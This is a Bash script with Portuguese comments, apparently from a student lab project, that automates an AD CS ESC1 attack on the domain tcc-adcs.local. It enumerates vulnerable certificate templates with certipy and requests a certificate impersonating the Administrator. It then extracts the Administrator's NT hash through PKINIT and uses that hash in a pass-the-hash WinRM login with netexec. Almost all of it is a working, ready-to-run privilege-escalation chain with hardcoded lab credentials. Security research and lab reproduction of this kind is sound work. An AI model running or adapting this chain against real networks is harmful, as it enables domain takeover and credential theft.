#!/bin/bash
# Reproduz o ataque ESC1 contra o template ESC1_TCC.
#
# Pre-requisitos no host Kali:
#   - certipy-ad (pip install certipy-ad ou apt install certipy-ad)
#   - netexec (apt install netexec)
# Ambiente:
#   - tcc-adcs.local em pleno funcionamento (passos 00 a 03 concluidos)
#   - usuario cassio.aluno (membro do grupo DU-Enrollers)
#
# Saidas sao gravadas em <repo>/evidencias/esc1/

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
OUT="$REPO_ROOT/evidencias/esc1"
mkdir -p "$OUT"
cd "$OUT"

USER='cassio.aluno@tcc-adcs.local'
PASS='Aluno@2026'
DC_IP='10.10.10.10'
CA='tcc-adcs-Root-CA'
CA_HOST='CA01.tcc-adcs.local'
TEMPLATE='ESC1_TCC'
ALVO='administrator@tcc-adcs.local'

echo '=== [1/4] Enumeracao de templates vulneraveis ==='
certipy find -u "$USER" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout \
    | tee 01-enumeration.log

echo
echo "=== [2/4] Solicitacao de certificado em nome de $ALVO ==="
certipy req -u "$USER" -p "$PASS" -dc-ip "$DC_IP" \
            -target "$CA_HOST" -ca "$CA" -template "$TEMPLATE" \
            -upn "$ALVO" -out admin-esc1 \
    | tee 02-req.log

echo
echo '=== [3/4] Autenticacao PKINIT + UnPAC-the-Hash ==='
certipy auth -pfx admin-esc1.pfx -dc-ip "$DC_IP" \
             -username administrator -domain tcc-adcs.local \
    | tee 03-auth.log

NT_HASH=$(grep -oE '[a-f0-9]{32}' 03-auth.log | tail -1)
if [ -z "$NT_HASH" ]; then
    echo 'ERRO: nao foi possivel extrair o hash NT da saida do certipy auth' >&2
    exit 1
fi
echo "[+] Hash NT do Administrator: $NT_HASH"

echo
echo '=== [4/4] Validacao via Pass-the-Hash (netexec winrm) ==='
netexec winrm "$DC_IP" -u administrator -H "$NT_HASH" \
    -x "whoami /groups | findstr /i Admins" \
    | tee 04-pth.log

echo
echo "[+] Reproducao ESC1 concluida. Evidencias em $OUT"
